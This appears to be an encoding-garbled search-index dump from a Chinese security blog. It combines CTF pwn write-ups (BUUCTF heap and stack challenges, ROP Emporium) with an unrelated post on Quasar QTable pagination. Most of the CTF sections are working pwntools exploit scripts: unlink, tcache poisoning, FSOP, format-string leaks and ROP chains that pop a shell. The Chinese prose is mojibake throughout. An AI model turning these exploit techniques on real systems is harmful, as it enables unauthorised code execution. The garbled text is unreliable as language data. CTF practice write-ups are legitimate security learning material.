åœ°å€ã€‚è¿™é‡Œç”¨çš„æ–¹æ³•æ˜¯åœ¨ bss æ®µç©ºä½™å¤„å†™å…¥ %llx.ï¼Œç„¶åæŠŠ free å…ˆåŠ«æŒåˆ° printfï¼Œå»æ‰“å°è¿™ä¸€æ®µæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç›¸å½“äºæ‰‹åŠ¨é€ äº†ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚è¿™æ ·å°±å¯ä»¥æ³„éœ²æ ˆä¸Šå†…å®¹ï¼Œä»è€Œæ³„éœ²ä½äºæ ˆä¸Šçš„ __libc_start_main_ret åœ°å€ï¼ˆä¸€èˆ¬ä½äºåç§»é‡ 11 å¤„ï¼‰ã€‚æœ€åæ³„éœ² libc å¾—åˆ° system åœ°å€ï¼Œè¦†ç›– atoi å³å¯ã€‚ def add(len,content='a'*8): sla('\u003e\u003e','1') sla('1024)',str(len)) sla('content:',content) def show(index): sla('\u003e\u003e','2') sla('note:',str(index)) def edit(index,content): sla('\u003e\u003e','3') sla('note:',str(index)) sla('content:',content) def delete(index): sla('\u003e\u003e','4') sla('note:',str(index)) negative = 0x8000000000000000 for i in range(8): add(0x200) edit(3,'a') fd = 0x6020c8+0x8*3-0x18 bk = 0x6020c8+0x8*3-0x10 fake_chunk = flat(0,0x201,fd,bk).ljust(0x200,'a') fake_chunk += flat(0x200,0x210) edit(-negative,fake_chunk) delete(4) edit(3,p64(elf.got['free'])) edit(0,p64(elf.plt['printf'])*2) bss_blank = 0x602100 edit(3,p64(bss_blank)) edit(0,'%llx.'*0x10) delete(0) lsmr = int(ru('success').split('.')[10],16) system,binsh = ret2libc(lsmr,'__libc_start_main_ret') edit(3,p64(elf.got['atoi'])) edit(0,p64(system)) sla('\u003e\u003e','/bin/sh\\x00') ","date":"2019-12-14","objectID":"/buu-pwn/:3:6","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"0ctf_2018_heapstorm2 åˆ†æå…ˆå’•äº†ï¼Œç­‰å®Œå…¨ç†è§£äº†å†è¡¥å……ã€‚å…ˆæ”¾ä¸€äº›å‚è€ƒçš„ wpï¼š wp1 wp2 wp3 def add(size): sl('1') ru('Size:') sl('%d' % size) ru('Command:') def edit(index, content): sl('2') sla('Index:',str(index)) sla('Size:', str(len(content))) sa('Content:',content) ru('Command:') def free(index): sl('3') sla('Index:',str(index)) ru('Command:') def show(index): sl('4') sla('Index:', str(index)) m = ru('Command:') pos1 = m.find(']: ') + len(']: ') pos2 = m.find('\\n1.') return m[pos1:pos2] add(0x18) # 0 add(0x508) # 1 add(0x18) # 2 edit(1,flat('a'*0x4f0,0x500)) add(0x18) # 3 add(0x508) # 4 add(0x18) # 5 edit(4,flat('a'*0x4f0,0x500)) add(0x18) # 6 free(1) edit(0,'a'*(0x18-12)) add(0x18) # 1 add(0x4d8) # 7 free(1) free(2) add(0x38) # 1 add(0x4e8) # 2 free(4) edit(3,'a'*(0x18-12)) add(0x18) # 4 add(0x4d8) # 8 free(4) free(5) add(0x48) # 4 free(2) add(0x4e8) # 2 free(2) storage = 0x13370800 fake = storage-0x20 payload = flat(0,0,0,0x4f1,0,fake) edit(7,payload) payload = flat(0,0,0,0,0,0x4e1,0,fake+8,0,fake-0x18-5) edit(8,payload) try: add(0x48) except: print('Try again?') payload = flat(0,0,0,0,0,0x13377331,storage) edit(2,payload) payload = flat(0,0,0,0x13377331,storage,0x1000) p1 = payload + flat(storage-0x20+3,8) edit(0,p1) heap = uu64(show(1)) p2 = payload + flat(heap+0x10,8) edit(0,p2) base = uu64(show(1))-88-libc.sym['__malloc_hook']-0x10 system = base + libc.sym['system'] free_hook = base + libc.sym['__free_hook'] p3 = payload + flat(free_hook,0x100,storage+0x50,0x100,'/bin/sh\\x00') edit(0,p3) edit(1,p64(system)) sl('3') sla('Index:','2') ","date":"2019-12-14","objectID":"/buu-pwn/:3:7","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"houseoforange_hitcon_2016 pwndbg\u003e p *(struct _IO_FILE*)0x555b7d04b4f0 $2 = { _flags = 1852400175, _IO_read_ptr = 0x61 \u003cerror: Cannot access memory at address 0x61\u003e, _IO_read_end = 0x0, _IO_read_base = 0x7f29a0f30510 \"\", _IO_write_base = 0x2 \u003cerror: Cannot access memory at address 0x2\u003e, _IO_write_ptr = 0x3 \u003cerror: Cannot access memory at address 0x3\u003e, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 '\\000', _shortbuf = \"\", _lock = 0x0, _offset = 0, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\\000' \u003crepeats 19 times\u003e } def add(size): sla('choice :','1') sla(\":\",str(size)) sa(':','a'*8) sla(':','1') sla(':','1') def show(): sla('choice :','2') def edit(size,name): sla('choice :','3') sla(\":\",str(size)) sa(':',name) sla(':','1') sla(':','1') add(0x18) useless = flat(0,0x21,0x1f00000001,0) payload = 'a'*0x10 + useless + flat(0,0xfa1) edit(0x40,payload) # corrupt top chunk add(0x1000) # old_top -\u003e unsorted add(0x400) # slice old top show() ru('a'*8) base = uu64(ru('\\n'))-1640-libc.sym['__malloc_hook']-0x10 leak('base',base) system = base + libc.sym['system'] io_list_all = base + libc.sym['_IO_list_all'] '''large chunk: 0x56512e53b0c0: 0x0000000000000000 0x0000000000000411 0x56512e53b0d0: 0x6161616161616161 0x00007f01ea979188 0x56512e53b0e0: 0x000056512e53b0c0 0x000056512e53b0c0 ''' edit(0x10,'a'*0x10) show() ru('a'*0x10) heap = uu64(ru('\\n')) - 0xc0 leak('heap',heap) # jump_table+0x18 payload = flat(0,0,0,system).ljust(0x400,'\\x00') # _flags,size,fd,bk,write_base,write_ptr,padding,fake_vtable payload += useless + flat('/bin/sh\\x00',0x61,0,io_list_all-0x10,2,3,'\\x00'*(0xd8-0x30),heap+0xd0) edit(0x1000,payload) sla('choice :','1') ","date":"2019-12-14","objectID":"/buu-pwn/:3:8","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ciscn_2019_final_2 æœ¬é¢˜éœ€è¦å°†è¯»å…¥çš„ flag çš„ fd æ”¹ä¸º 666ã€‚ å­˜åœ¨ tcache double free æ¼æ´ï¼Œé¦–å…ˆåˆ†é…å¤šä¸ª shortï¼Œåˆ©ç”¨ double free æ³„éœ²å †åœ°å€ã€‚ç„¶å tcache æŠ•æ¯’ï¼Œä¼ªé€  chunk0 å¤§å°ï¼Œå¹¶é‡Šæ”¾è¿›å…¥ unsorted bin æ³„éœ² libcã€‚æ³¨æ„é‡Šæ”¾å‰å…ˆå¡«æ»¡ tcache æ‰èƒ½è¿›å…¥ unsorted binã€‚ æ¥ä¸‹æ¥ç»§ç»­æŠ•æ¯’ä½¿ int çš„ fd æŒ‡å‘ filenoï¼Œå†æ¬¡ double free æ³„éœ² chunk0 çš„ mem æŒ‡é’ˆåœ°å€ã€‚æœ€åæŠ•æ¯’æŒ‡å‘ chunk0 çš„ mem æŒ‡é’ˆåœ°å€ï¼Œå†ç”³è¯·ä¸‰æ¬¡å°±å¯ä»¥ä¿®æ”¹ fileno äº†ã€‚ add(1,0x30) free(1) add(2,0x20) add(2,0x20) add(2,0x20) # total size: 0x90 add(2,0x20) # prevent merging free(2) add(1,0x30) free(2) show(2) ru('number :') chunk0 = int(ru('\\n'))-0xa0 leak('chunk0',chunk0) add(2,chunk0) # poisoning add(2,0xdeadbeef) add(2,0x91) # chunk0 for i in range(7): # fill tcache free(1) add(2,0x20) free(1) # unsorted show(1) ru('number :') base = int(ru('\\n'))-96-libc.sym['__malloc_hook']-0x10 leak('base',base) fileno = base+libc.sym['_IO_2_1_stdin_']+0x70 add(1,fileno) # poisoning add(1,0x30) free(1) add(2,0x20) free(1) show(1) ru('number :') chunk0_mem = int(ru('\\n'))-0x30 add(1,chunk0_mem) # poisoning add(1,0xdeadbeef) add(1,0xdeadbeef) add(1,666) sla('\u003e',4) ","date":"2019-12-14","objectID":"/buu-pwn/:3:9","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"å¼ºç½‘æ¯_æ‹Ÿæ€_stkof é‡‡ç”¨äº†æ‹Ÿæ€é˜²å¾¡ï¼Œç®€å•æ¥è¯´å°±æ˜¯è¦ç”¨åŒä¸€ä¸ªè„šæœ¬åŒæ—¶åœ¨ 32 ä½å’Œ 64 ä½ç¨‹åºä¸Š getshell ä¸”ä¸¤ä¸ªç¨‹åºçš„è¾“å‡ºå¿…é¡»ç›¸åŒã€‚ é¦–å…ˆæ£€æŸ¥ä¸¤ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ¼æ´éƒ½æ˜¯ç®€å•çš„æ ˆæº¢å‡ºå¹¶ä¸”ç©ºé—´å¾ˆå¤§ã€‚åŒºåˆ«åœ¨äºå¯ä»¥æº¢å‡ºçš„é•¿åº¦ç›¸å·® 8 å­—èŠ‚ï¼Œè¿™ 8 å­—èŠ‚åº”è¯¥å°±æ˜¯èƒ½å¤Ÿç”¨åŒä¸€ä¸ªè„šæœ¬çš„å…³é”®æ‰€åœ¨ã€‚ å®¹æ˜“æƒ³åˆ°åˆ©ç”¨å¸¸è§„ ret2syscallï¼Œåˆ†åˆ«å†™å‡º 32 ä½å’Œ 64 ä½è„šæœ¬ï¼š pop_eax = 0x80a8af6 pop_dcb = 0x806e9f1 int_80 = 0x80495a3 data = 0x80d7000 chain86 = [ 'a'*(0x10c+4), elf.sym['read'], pop_dcb,0,data,0x100, pop_dcb,0,0,data, pop_eax,0xb, int_80 ] payload = flat(chain86) sa('?',payload) s('/bin/sh\\x00') pop_rax = 0x43b97c pop_rdi = 0x4005f6 pop_rsi = 0x405895 pop_rdx = 0x43b9d5 syscall = 0x461645 data = 0x6a4e40 chain64 = [ 'a'*(0x110+8), pop_rax,0,pop_rdi,0, pop_rsi,data,pop_rdx,0x100, syscall, pop_rax,59,pop_rdi,data, pop_rsi,0,pop_rdx,0, syscall ] payload = flat(chain64) sa('?',payload) s('/bin/sh\\x00') é‚£ä¹ˆæ€ä¹ˆæŠŠä¸¤è€…åˆå¹¶å‘¢ï¼Ÿè¿™å°±éœ€è¦ç”¨åˆ° 8 å­—èŠ‚çš„æ ˆæº¢å‡ºé•¿åº¦å·®ï¼Œåœ¨è¿™ 8 å­—èŠ‚ä¸­ï¼Œæˆ‘ä»¬åˆ†åˆ«è°ƒæ•´ 32 ä½ç¨‹åºå’Œ 64 ä½ç¨‹åºçš„ esp å’Œ rsp æŒ‡é’ˆï¼Œä½¿å¾—ç»è¿‡è°ƒæ•´åæ ˆä¸Šçš„è¿”å›åœ°å€æŒ‡å‘ payload çš„ä¸åŒéƒ¨åˆ†ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ ˆå˜é‡åœ¨ 32 ä½ä¸‹ä½äº esp+0xcï¼Œåœ¨ 64 ä½ä¸‹ä½äº rsp+0x0ï¼Œåœ¨è®¡ç®—éœ€è¦å¡«å……çš„ padding æ—¶éœ€è¦è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ã€‚ pop_eax = 0x80a8af6 pop_dcb = 0x806e9f1 int_80 = 0x80495a3 data86 = 0x80d7000 read = 0x806c8e0 add_esp_20 = 0x80a69f2 offset86 = 0x20-0xc # esp+0xc chain86 = [ 'a'*offset86, read, pop_dcb,0,data86,0x8, pop_dcb,0,0,data86, pop_eax,0xb, int_80 ] payload86 = flat(chain86,word_size=32) pop_rax = 0x43b97c pop_rdi = 0x4005f6 pop_rsi = 0x405895 pop_rdx = 0x43b9d5 syscall = 0x461645 data64 = 0x6a4e40 add_rsp_80 = 0x40cd17 offset64 = 0x80-len(payload86) # rsp+0x0 print hex(offset64) chain64 = [ 'a'*offset64, pop_rax,0,pop_rdi,0, pop_rsi,data64,pop_rdx,0x100, syscall, pop_rax,59,pop_rdi,data64, pop_rsi,0,pop_rdx,0, syscall ] payload64 = flat(chain64,word_size=64) payload = 'a'*0x110 + (p32(add_esp_20)+'aaaa') + p64(add_rsp_80) + payload86 + payload64 sa('?',payload) s('/bin/sh\\x00') ","date":"2019-12-14","objectID":"/buu-pwn/:3:10","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"axb_2019_heap åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å †åœ°å€å’Œ libcã€‚éšåï¼Œå¯ä»¥å‘ç° edit æ—¶å­˜åœ¨ off by oneï¼Œæˆ‘ä»¬åœ¨æ„é€  unlink çš„ fake chunk æ—¶ï¼Œè¯¥æ¼æ´ä¼šå¯¼è‡´ä¿®æ”¹ä¸‹ä¸€ä¸ª chunk çš„ prev_size åä¼šè¦†ç›–æ‰å®ƒçš„ size å­—æ®µæœ€åä¸€ä¸ªå­—èŠ‚ã€‚ä½†æ˜¯åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰‹åŠ¨æ¢å¤æœ€åä¸€ä¸ªå­—èŠ‚ã€‚ï¼Œè¿™é‡Œæ˜¯ 0xa0ã€‚ æ¥ä¸‹æ¥å°±å¸¸è§„ unlinkï¼Œè¦†ç›– free_hook ä¸º systemï¼Œæ³¨æ„ç»´æŒåŸ note æ•°ç»„ç»“æ„ã€‚ sla('name:','%11$p.%15$p') ru(',') heap = int(ru('.'),16)-0x1186 base = int(ru('\\n'),16)-0x20830 leak('heap',heap) leak('base',base) note = heap+0x202060 system = base+libc.sym['system'] free_hook = base+libc.sym['__free_hook'] add(0,0x98) add(1,0x98) add(2,0x90) add(3,0x90,'/bin/sh\\x00') fd = note-0x18 bk = note-0x10 fake = flat(0,0x91,fd,bk).ljust(0x90,'\\x00') + p64(0x90)+'\\xa0' edit(0,fake) free(1) edit(0,flat(0,0,0,free_hook,0x98)) edit(0,p64(system)) free(3) ","date":"2019-12-14","objectID":"/buu-pwn/:3:11","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["å‰ç«¯"],"content":"QTable æ˜¯ Quasar Framework çš„ç»„ä»¶ä¹‹ä¸€ï¼ŒåŠŸèƒ½æ¯”è¾ƒå¤æ‚ã€‚è¿™ç¯‡æ–‡ç« ä»‹ç»äº†å¦‚ä½•é…åˆæœåŠ¡ç«¯åˆ†é¡µæ¥ä½¿ç”¨ QTable ç»„ä»¶ã€‚ å‚è€ƒäº† Quasar å®˜æ–¹æ–‡æ¡£ã€‚ ","date":"2019-12-12","objectID":"/qtable-ss-pagination/:0:0","tags":["Quasar"],"title":"æœ¯ä¸šä¸“æ”»ï¼šQTable æœåŠ¡ç«¯åˆ†é¡µå®è·µ","uri":"/qtable-ss-pagination/"},{"categories":["å‰ç«¯"],"content":"èƒŒæ™¯ æœ€è¿‘æ¥çš„ä¸€ä¸ªé¡¹ç›®ä¸­æœ‰ä¸€ä¸ªé¡µé¢éœ€è¦åŠ è½½ä¸€ä¸ªè¡¨æ ¼ï¼Œè¡¨æ ¼çš„æ•°æ®æ˜¯é€šè¿‡å¼‚æ­¥è°ƒç”¨ä»åç«¯è·å–çš„ã€‚ç”±äºæ•°æ®é‡è¾ƒå¤§ï¼Œå¯èƒ½éœ€è¦åˆ†é¡µã€æ’åºç­‰æ“ä½œï¼Œæˆ‘é€‰æ‹©ä½¿ç”¨ QTable ç»„ä»¶ï¼Œå…¶æ ¸å¿ƒå±æ€§åŒ…å«ï¼š dataï¼šæ•°ç»„ï¼ŒæŒ‰è¡Œå­˜æ”¾è¡¨æ ¼æ•°æ®ï¼Œæ¯ä¸ªå¯¹è±¡ä¸ºä¸€è¡Œ columnsï¼šæ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ è¡¨ç¤ºä¸€åˆ—çš„å±æ€§ï¼Œä¾‹å¦‚åˆ—åã€è¯¥åˆ—çš„æ ·å¼ã€æ˜¯å¦èƒ½å¤Ÿæ’åºç­‰ç­‰ row-keyï¼šæŸä¸€åˆ—çš„ name å±æ€§ï¼Œç”¨æ¥å”¯ä¸€æ ‡è¯†ä¸€è¡Œ pagination.syncï¼šä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…å«äº†åˆ†é¡µå™¨çš„ä¸€äº›å±æ€§ è¿™é‡Œå› ä¸ºè¦å¤„ç†åˆ†é¡µé—®é¢˜ï¼Œæˆ‘ç€é‡å…³æ³¨çš„æ˜¯ pagination.sync å±æ€§ï¼Œå®˜æ–¹æ–‡æ¡£ä¸­çš„ä¾‹å­æ˜¾ç¤ºå®ƒé•¿è¿™æ ·ï¼š pagination: { sortBy: 'name', descending: false, page: 2, rowsPerPage: 3 // rowsNumber: xx if getting data from a server } sortBy å­—æ®µè¡¨ç¤ºæ’åºçš„å…³é”®å­—ï¼Œdescending è¡¨ç¤ºæ˜¯å¦æ˜¯é™åºæ’åºï¼Œpage è¡¨ç¤ºå½“å‰æ‰€åœ¨é¡µï¼ŒrowsPerPage è¡¨ç¤ºå½“å‰é€‰æ‹©çš„æ¯é¡µæœ€å¤§è¡Œæ•°ã€‚ç”¨æˆ·æ“ä½œåˆ†é¡µå™¨æ—¶ï¼Œpagination ä¹Ÿä¼šç›¸åº”åœ°æ”¹å˜ã€‚ ","date":"2019-12-12","objectID":"/qtable-ss-pagination/:1:0","tags":["Quasar"],"title":"æœ¯ä¸šä¸“æ”»ï¼šQTable æœåŠ¡ç«¯åˆ†é¡µå®è·µ","uri":"/qtable-ss-pagination/"},{"categories":["å‰ç«¯"],"content":"é—®é¢˜ åœ¨åç«¯ï¼Œå½“æˆ‘è¯·æ±‚è¡¨æ ¼æ•°æ®æ—¶ï¼Œéœ€è¦æä¾›ä¸¤ä¸ªå‚æ•° pageNum å’Œ pageSizeï¼Œå«ä¹‰ä¸ page å’Œ rowPerPage ç›¸åŒã€‚æˆ‘ä»¬è€ƒè™‘ä»¥ä¸‹åœºæ™¯ï¼š å½“å‰ç”¨æˆ·å…±æœ‰ 11 æ¡è¡¨æ ¼æ•°æ®ã€‚å‡è®¾ç”¨æˆ·é€‰æ‹©æ¯é¡µæ˜¾ç¤º 10 æ¡æ•°æ®ï¼Œé‚£ä¹ˆå‰ç«¯å°†å‘é€è¯·æ±‚ ?pageNum=1\u0026pageSize=10 å¹¶æ‹¿åˆ°ç¬¬ 1 é¡µçš„ 10 æ¡æ•°æ®ã€‚ç„¶è€Œæ­¤æ—¶ï¼ŒQTable ä¼šå‘ç°åªè·å–äº† 10 æ¡æ•°æ®ï¼Œå› æ­¤åˆ†é¡µå™¨çš„ ä¸‹ä¸€é¡µ æŒ‰é’®å¤„äºä¸å¯ç”¨çŠ¶æ€ã€‚è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡ç”¨æˆ·æ“ä½œè§¦å‘ ?pageNum=2\u0026pageSize=10 è¯·æ±‚ï¼Œå› æ­¤æ— æ³•è·å–ç¬¬ 11 æ¡æ•°æ®ã€‚ æ¢è€Œè¨€ä¹‹ï¼ŒQTable çš„å‰ç«¯åˆ†é¡µä¸åç«¯åˆ†é¡µæ— æ³•å…¼å®¹ï¼Œä½†æ˜¯åè€…æ˜¯å¿…é¡»çš„ï¼Œå› ä¸ºæ•°æ®é‡éå¸¸å¤§ï¼Œä¸å¯èƒ½é€šè¿‡ä¸€æ¬¡è°ƒç”¨å‘é€ã€‚ ","date":"2019-12-12","objectID":"/qtable-ss-pagination/:2:0","tags":["Quasar"],"title":"æœ¯ä¸šä¸“æ”»ï¼šQTable æœåŠ¡ç«¯åˆ†é¡µå®è·µ","uri":"/qtable-ss-pagination/"},{"categories":["å‰ç«¯"],"content":"è§£å†³æ–¹æ¡ˆ å¹¸è¿çš„æ˜¯ï¼Œåœ¨ è¿™é‡Œ æˆ‘å‘ç°ï¼ŒQuasar çš„å¼€å‘è€…æ—©å°±æƒ³åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œç‰¹åœ°ä¸ºæœåŠ¡ç«¯åˆ†é¡µä½œäº†å‡†å¤‡ã€‚å›é¡¾ pagination çš„ç»“æ„ï¼Œæˆ‘ä»¬è¿˜æ²¡æœ‰è§£é‡Š rowsNumber çš„ä½œç”¨ï¼šå£°æ˜è¯¥å­—æ®µä»£è¡¨æˆ‘ä»¬å°†é‡‡ç”¨åç«¯åˆ†é¡µçš„æ–¹å¼ï¼Œè€Œå®ƒçš„å«ä¹‰å°±æ˜¯è¡¨æ ¼æ•°æ®çš„æ€»è¡Œæ•°ï¼ˆåœ¨ä¸Šä¾‹ä¸­æ˜¯ 11ï¼‰ã€‚è¿™ä¸ªå€¼æ˜¯åç«¯è¿”å›ç»™æˆ‘ä»¬çš„ã€‚ åŒæ—¶ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç»™ q-table ç»„ä»¶æ·»åŠ å±æ€§ @requestã€‚å¦‚æœç”±äºé¡µæ•°åˆ‡æ¢ / æ’åº / æœç´¢å¯¼è‡´å½“å‰é¡µè¡¨æ ¼æ•°æ®å˜åŒ–ï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘ request äº‹ä»¶ï¼Œæ‰§è¡Œå¯¹åº”çš„å‡½æ•°ã€‚çœ‹èµ·æ¥éå¸¸å®¹æ˜“ç†è§£ï¼Œç„¶è€Œè¿™é‡Œå´æœ‰å‘ç‚¹ã€‚ åœ¨æˆ‘çš„é¡¹ç›®ä¸­è®¾ç½®äº†ï¼š :pagination.sync=\"pagination\" @request=\"getList\" é‚£ä¹ˆ getList å‡½æ•°å°†æ¥æ”¶åˆ°å‚æ•° propsã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬æ‹¥æœ‰ä¸¤ä¸ª pagination: this.pagination ï¼ˆç”¨äºè®¾ç½® pagination.sync å±æ€§ï¼‰ props.pagination èµ·åˆæˆ‘é‡‡ç”¨äº†å¦‚ä¸‹æ–¹å¼å‘é€è¯·æ±‚ï¼š pageNum=${this.pagination.page}\u0026pageSize=${this.pagination.rowsPerPage} ç»“æœå‘ç°åˆ‡åˆ°ä¸‹ä¸€é¡µæ—¶ï¼Œå°½ç®¡è¯·æ±‚æˆåŠŸä½†è¡¨æ ¼å¹¶ä¸å˜åŒ–ï¼Œè°ƒè¯•å‘ç° this.pagination å¹¶æ²¡æœ‰å˜ï¼çœŸæ­£å˜åŒ–çš„æ˜¯ props.paginationï¼Œå› æ­¤æ­£è§£æ˜¯å°†è¯·æ±‚ä¸­çš„ this æ›¿æ¢ä¸º propsã€‚ ","date":"2019-12-12","objectID":"/qtable-ss-pagination/:3:0","tags":["Quasar"],"title":"æœ¯ä¸šä¸“æ”»ï¼šQTable æœåŠ¡ç«¯åˆ†é¡µå®è·µ","uri":"/qtable-ss-pagination/"},{"categories":["å‰ç«¯"],"content":"æ€»ç»“ æ‰€ä»¥ï¼Œåœ¨ QTable ä¸­ä½¿ç”¨æœåŠ¡ç«¯åˆ†é¡µçš„æ­£ç¡®å§¿åŠ¿å¦‚ä¸‹ï¼š è®¾ç½® q-table ç»„ä»¶çš„ pagination.sync å±æ€§ï¼Œæ³¨æ„å¿…é¡»æœ‰ rowsNumber å­—æ®µ è®¾ç½® q-table ç»„ä»¶çš„ @request å±æ€§ï¼Œåœ¨è¿™é‡Œæ‰§è¡Œå¼‚æ­¥è°ƒç”¨è·å–æ•°æ® è€Œåœ¨ @request å¯¹åº”çš„å‡½æ•°ä¸­ï¼Œéœ€è¦ï¼š åˆ©ç”¨ props.pagination å‘é€è¯·æ±‚è·å–æ•°æ® ç”¨åç«¯è¿”å›çš„å€¼æ›´æ–° this.pagination è¿˜å¯ä»¥åŠ ä¸ª loading ","date":"2019-12-12","objectID":"/qtable-ss-pagination/:4:0","tags":["Quasar"],"title":"æœ¯ä¸šä¸“æ”»ï¼šQTable æœåŠ¡ç«¯åˆ†é¡µå®è·µ","uri":"/qtable-ss-pagination/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"é’ˆå¯¹ ROP å­¦ä¹ äº†ä¸€ä¸‹ï¼Œå°±è®°å½•ä¸€ä¸‹ 64 ä½çš„åšæ³•ï¼Œ32 ä½åŒç†ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¯¹è¿™ä¸ªç½‘ç«™ç‰¹åˆ«æœ‰å¥½æ„Ÿã€‚ ","date":"2019-12-09","objectID":"/rop-emporium/:0:0","tags":["æ ˆæ¼æ´"],"title":"ROP Emporium ç»ƒä¹ è®°å½•","uri":"/rop-emporium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ret2win æœ€ç®€å•çš„ ret2textï¼Œç»™äº†åˆ° ebp çš„åç§»é‡ï¼Œåªéœ€è¦æ‰¾åˆ°å‡½æ•° ret2win çš„åœ°å€è¿”å›è¿‡å»å³å¯ã€‚ from pwn import * p = process('./ret2win') elf = ELF('./ret2win') p.recvuntil('\u003e') payload = 'a'*0x28 + p64(elf.symbols['ret2win']) p.sendline(payload) p.interactive() ","date":"2019-12-09","objectID":"/rop-emporium/:1:0","tags":["æ ˆæ¼æ´"],"title":"ROP Emporium ç»ƒä¹ è®°å½•","uri":"/rop-emporium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"split æ‹†å¼€äº† system å’Œ /bin/cat flag.txtï¼Œå› æ­¤æ‰¾åˆ°ä¸¤è€…åœ°å€ï¼Œå‡†å¤‡å¥½å‚æ•°åè¿”å›åˆ° system ä¸Šå³å¯ã€‚ æ³¨æ„åœ¨ 32 ä½ä¸Šï¼Œåªéœ€è¦å…ˆæ”¾ system åœ°å€ï¼Œéšåå¡«å…… 4 å­—èŠ‚è¿”å›åœ°å€ï¼Œå†æ”¾ /bin/cat flag.txt åœ°å€å³å¯ã€‚è€Œ 64 ä½ä¸Šä¼ å‚éœ€è¦æ§åˆ¶ rdi å¯„å­˜å™¨ï¼Œå› æ­¤éœ€è¦ pop rdi; retã€‚ from pwn import * context(arch='amd64', os='linux', log_level='DEBUG') p = process('./split') elf = ELF('./split') p.recvuntil('\u003e') pop_rdi_ret = 0x400883 bin_cat_flag = 0x601060 payload = flat(['a'*0x28, pop_rdi_ret, bin_cat_flag, elf.plt['system']]) p.sendline(payload) p.interactive() ","date":"2019-12-09","objectID":"/rop-emporium/:2:0","tags":["æ ˆæ¼æ´"],"title":"ROP Emporium ç»ƒä¹ è®°å½•","uri":"/rop-emporium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"callme é¢˜ç›®è¦æ±‚æ˜¯ä¾æ¬¡è°ƒç”¨ callme_one(1,2,3)ï¼Œcallme_two(1,2,3)ï¼Œcallme_three(1,2,3)ã€‚è¦æ§åˆ¶ä¸‰ä¸ªå‚æ•°å°±éœ€è¦ä¸‰ä¸ªå¯„å­˜å™¨ rdi rsi rdxï¼Œæˆ‘ä»¬æ°å¥½èƒ½æ‰¾åˆ°ä¸€æ¡è¯­å¥ï¼š 0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret ä¹‹åå°±æ˜¯å¸ƒç½®å¥½å‚æ•°äº†ï¼š from pwn import * context(arch='amd64', os='linux', log_level='DEBUG') p = process('./callme') elf = ELF('./callme') p.recvuntil('\u003e') pop_rdi_rsi_rdx_ret = 0x401ab0 payload = flat(['a'*0x28, pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt['callme_one'], pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt['callme_two'], pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt['callme_three']]) p.sendline(payload) p.interactive() ","date":"2019-12-09","objectID":"/rop-emporium/:3:0","tags":["æ ˆæ¼æ´"],"title":"ROP Emporium ç»ƒä¹ è®°å½•","uri":"/rop-emporium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"write4 /bin/cat flag.txt å­—ç¬¦ä¸²å½»åº•æ¶ˆå¤±äº†ï¼Œé¢˜ç›®æç¤ºæˆ‘ä»¬éœ€è¦è‡ªå·±å‘å†…å­˜ä¸­å†™å…¥è¯¥å­—ç¬¦ä¸²ã€‚checksec å¯çŸ¥ GOT è¡¨å¯å†™ã€‚ ä¸ºäº†å†™ GOT è¡¨ï¼Œé¦–å…ˆè¦æ§åˆ¶å¯„å­˜å™¨ï¼Œç„¶åé€šè¿‡ mov [reg], reg è¿™æ 